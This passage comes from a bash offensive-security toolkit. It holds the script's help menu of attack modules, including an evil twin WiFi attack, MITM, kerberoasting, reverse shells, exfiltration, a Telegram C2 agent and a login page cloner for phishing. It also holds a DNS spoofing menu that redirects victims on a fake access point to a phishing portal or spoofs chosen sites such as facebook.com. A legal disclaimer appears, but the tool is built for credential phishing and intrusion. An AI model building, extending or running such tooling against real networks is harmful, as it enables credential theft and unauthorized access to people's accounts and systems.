        phb_row "    OFFENSIVE:  [24] Page Cloner  [25] Archive Cracker  [29] Modules" "${DIM}${GREY}"
        phb_row "    EXTRAS:     [26] SMB Crawler  [27] Cred Harvester  [?] Help" "${DIM}${GREY}"
        phb_div

        phb_row "  ── HOW TO USE EACH MODULE ──" "${BOLD}${YELLOW}"
        phb_row "    [1]  WiFi — scan, capture handshake, evil twin, WPS attack" "${DIM}${GREY}"
        phb_row "         requires: wlan0 in monitor mode (option [m] in submenu)" "${DIM}${GREY}"
        phb_row "    [2]  Bluetooth — BLE scan, SDP dump, L2CAP flood, spoofing" "${DIM}${GREY}"
        phb_row "         requires: BT adapter + hciconfig access" "${DIM}${GREY}"
        phb_row "    [3]  Wireless Ext — KARMA, WPA3 SAE, cell/SDR, physical" "${DIM}${GREY}"
        phb_row "    [4]  LAN — scan hosts, topology, tracker, MITM, rogue DHCP" "${DIM}${GREY}"
        phb_row "    [5]  AD — kerberoast, AS-REP, relay, BloodHound, spray" "${DIM}${GREY}"
        phb_row "    [6]  Internal — nmap -p-, MSF import, DB connect, weak creds" "${DIM}${GREY}"
        phb_row "    [7]  Web — recon, nikto, sqlmap, xss, nuclei, DoS floods" "${DIM}${GREY}"
        phb_row "    [8]  Cloud — docker API, k8s, AWS keys, container escape" "${DIM}${GREY}"
        phb_row "    [9]  Tunnels — reverse shells, chisel, ligolo, iodine, exfil" "${DIM}${GREY}"
        phb_row "    [10] Live — threat maps, abuse feeds (opens browser)" "${DIM}${GREY}"
        phb_row "    [11] Tor — rotate exit IP, MAC changer, proxychains" "${DIM}${GREY}"
        phb_row "    [12] Tunnels setup — ngrok, cloudflared, local HTTP server" "${DIM}${GREY}"
        phb_row "    [13] Custom pages — write/fetch/preview captive portal pages" "${DIM}${GREY}"
        phb_row "    [14] PyPhisher — external phishing framework launcher" "${DIM}${GREY}"
        phb_row "    [15] OSINT — email/user/phone/domain lookups + dork builder" "${DIM}${GREY}"
        phb_row "    [16] MSF Auto — nmap scan + MSF db import + module match" "${DIM}${GREY}"
        phb_row "    [17] AUTO-PWN — full chain on ONE target (scan→attack→loot)" "${DIM}${GREY}"
        phb_row "    [18] Sessions — create/switch engagements, save loot per session" "${DIM}${GREY}"
        phb_row "    [19] Report — HTML report + credential vault access" "${DIM}${GREY}"
        phb_row "    [21] Post-Ex — SAM dump, LSA, persistence (needs creds)" "${DIM}${GREY}"
        phb_row "    [22] Telegram C2 — build persistent agent, command loop" "${DIM}${GREY}"
        phb_row "    [23] Hashcat Auto — detect hash type, auto-crack" "${DIM}${GREY}"
        phb_row "    [24] Page Cloner — clone real login page as phishing template" "${DIM}${GREY}"
        phb_row "    [25] Archive Cracker — ZIP / RAR / 7Z password crack" "${DIM}${GREY}"
        phb_row "    [26] SMB Crawler — enumerate shares, grab files, grep secrets" "${DIM}${GREY}"
        phb_row "    [27] Cred Harvester — passive NTLM capture on LAN" "${DIM}${GREY}"
        phb_row "    [28] Kerberos Chain — AS-REP + Kerberoast + auto-crack" "${DIM}${GREY}"
        phb_row "    [29] Show all modules — this list" "${DIM}${GREY}"
        phb_row "    [99] Reload — re-execute phobia.sh from disk" "${DIM}${GREY}"
        phb_row "    [0]  Exit — cleanup + close" "${DIM}${GREY}"
        phb_div

        phb_row "  ── KEYBINDINGS ──" "${BOLD}${CYAN}"
        phb_row "    Ctrl+C  once        → return to main menu" "${DIM}${GREY}"
        phb_row "    Ctrl+C  twice (3s)  → quit + cleanup" "${DIM}${GREY}"
        phb_row "    Ctrl+L              → clear screen" "${DIM}${GREY}"
        phb_row "    ENTER               → confirm / continue" "${DIM}${GREY}"
        phb_div

        phb_row "  ── WHERE THINGS ARE SAVED ──" "${BOLD}${GREEN}"
        phb_row "    sessions:  $SESSIONS_ROOT" "${DIM}${GREY}"
        phb_row "    vault:     $VAULT_DB" "${DIM}${GREY}"
        phb_row "    logs:      $LOGS_DIR" "${DIM}${GREY}"
        phb_row "    pages:     $PAGES_DIR" "${DIM}${GREY}"
        phb_row "    wordlists: $WORDLIST_DIR" "${DIM}${GREY}"
        phb_div

        phb_row "  ── LEGAL ──" "${BOLD}${RED}"
        phb_row "    Only use against systems you own or have written permission" "${YELLOW}"
        phb_row "    to test. Unauthorized access is a crime in every jurisdiction." "${YELLOW}"
        phb_div

        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" H
        case "$H" in
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}



ensure_scan_parser
show_intro
show_intro_main_frame
print_banner
check_tools
menu_surface

# ===============================================================
# BOX HELPERS — universal wide box for any menu
# usage:  box_start "T I T L E"
#         box_row "  content" "color"
#         box_div
#         box_end
# ===============================================================

_box_geometry() {
    local cols
    cols=$(stty size 2>/dev/null | awk '{print $2}')
    [ -z "$cols" ] && cols=$(tput cols 2>/dev/null)
    [ -z "$cols" ] && cols=100
    [ "$cols" -lt 120 ] && cols=120
    BOX_W=$(( cols - 20 ))
    [ $BOX_W -gt 220 ] && BOX_W=220
    [ $BOX_W -lt 100 ] && BOX_W=100
    BOX_PAD=$(( (cols - BOX_W - 2) / 2 ))
    [ $BOX_PAD -lt 0 ] && BOX_PAD=0
}

box_start() {
    local title="$1"
    _box_geometry
    local line="+"
    local i
    for ((i=0;i<BOX_W;i++)); do line+="="; done
    line+="+"
    printf "%*s" "$BOX_PAD" ""
    echo -e "${BOLD}${CYAN}${line}${NC}"
    printf "%*s" "$BOX_PAD" ""
    echo -e "${BOLD}${CYAN}|${NC}"
    # centered title
    local len; len=$(_plen "$title")
    local l=$(( (BOX_W - len) / 2 )); [ $l -lt 0 ] && l=0
    local r=$(( BOX_W - len - l )); [ $r -lt 0 ] && r=0
    printf "%*s" "$BOX_PAD" ""
    printf "${BOLD}${CYAN}|${NC}"
    printf "%*s" "$l" ""
    printf "${BOLD}${MAGENTA}%s${NC}" "$title"
    printf "%*s" "$r" ""
    printf "${BOLD}${CYAN}|${NC}\n"
    printf "%*s" "$BOX_PAD" ""
    echo -e "${BOLD}${CYAN}|${NC}"
    # separator
    local sep="+"
    for ((i=0;i<BOX_W;i++)); do sep+="-"; done
    sep+="+"
    printf "%*s" "$BOX_PAD" ""
    echo -e "${BOLD}${CYAN}${sep}${NC}"
}

box_row() {
    local text="$1"
    local color="${2:-}"
    local len; len=$(_plen "$text")
    local fill=$(( BOX_W - len - 1 )); [ $fill -lt 0 ] && fill=0
    printf "%*s" "$BOX_PAD" ""
    printf "${BOLD}${CYAN}|${NC} "
    if [ -n "$color" ]; then
        echo -ne "${color}${text}${NC}"
    else
        echo -ne "$text"
    fi
    printf "%*s" "$fill" ""
    printf "${BOLD}${CYAN}|${NC}\n"
}

box_div() {
    local line="+"
    local i
    for ((i=0;i<BOX_W;i++)); do line+="-"; done
    line+="+"
    printf "%*s" "$BOX_PAD" ""
    echo -e "${BOLD}${CYAN}${line}${NC}"
}

box_end() {
    box_div
    echo ""
}

# ===============================================================
# POLISHED dnsspoof_pick_mode — rewrapped inside the box
# ===============================================================
dnsspoof_pick_mode() {
    _clear_screen
    print_banner
    box_start "◤  D N S   S P O O F I N G   M O D E  ◢"
    box_row "  When victims connect to the fake AP, we control how DNS behaves." "${DIM}${GREY}"
    box_div
    box_row "  [1]  All requests → portal     ${DIM}(everything shows our phishing page)${NC}" "${BOLD}${CYAN}"
    box_row "        ^ pick this for captive popup on Windows/Android/iPhone" "${DIM}${GREY}"
    box_row "  [2]  Portal + real internet    ${DIM}(phishing some, real sites others)${NC}" "${BOLD}${CYAN}"
    box_row "  [3]  Custom spoof list         ${DIM}(pick specific domains to redirect)${NC}" "${BOLD}${CYAN}"
    box_row "  [4]  Pass through (no spoof)   ${DIM}(DNS goes to real servers)${NC}" "${BOLD}${CYAN}"
    box_row "  [5]  DNS popup only            ${DIM}(victim sees allow/block DNS prompt)${NC}" "${BOLD}${YELLOW}"
    box_row "  [6]  No DNS at all             ${DIM}(no interception, no popup - plain DHCP)${NC}" "${BOLD}${YELLOW}"
    box_div
    box_row "  [0]  Cancel" "${RED}"
    box_end
    read -p "$(echo -e ${BOLD}${YELLOW}'  Choice [1]: '${NC})" DM
    DM="${DM:-1}"
    DNS_MODE="$DM"

    case "$DM" in
        1) echo -e "  ${GREEN}[+] All DNS → $PORTAL_IP${NC}" ;;
        2)
            echo -e "  ${GREEN}[+] Selective spoofing.${NC}"
            echo -e "${DIM}    Comma-separated list, e.g. facebook.com,instagram.com${NC}"
            read -p "$(echo -e ${YELLOW}'Sites to spoof: '${NC})" SPOOF_LIST
            ;;
        3)
            echo -e "${DIM}    One hostname per line. Blank line to finish.${NC}"
            : > /tmp/dns_spoof_list.txt
            while true; do
                read -p "  > " LINE
                [ -z "$LINE" ] && break
                echo "$LINE" >> /tmp/dns_spoof_list.txt
            done
            SPOOF_LIST=$(paste -sd, /tmp/dns_spoof_list.txt)
            echo -e "${GREEN}[+] Spoofing: $SPOOF_LIST${NC}"
            ;;
        4) echo -e "  ${GREEN}[+] DNS passes through to real servers.${NC}" ;;
        5) echo -e "  ${GREEN}[+] Victim sees a DNS allow/block prompt on their phone.${NC}" ;;
        6) echo -e "  ${GREEN}[+] No DNS interception - plain DHCP with real DNS server.${NC}" ;;
    esac
    echo ""
}

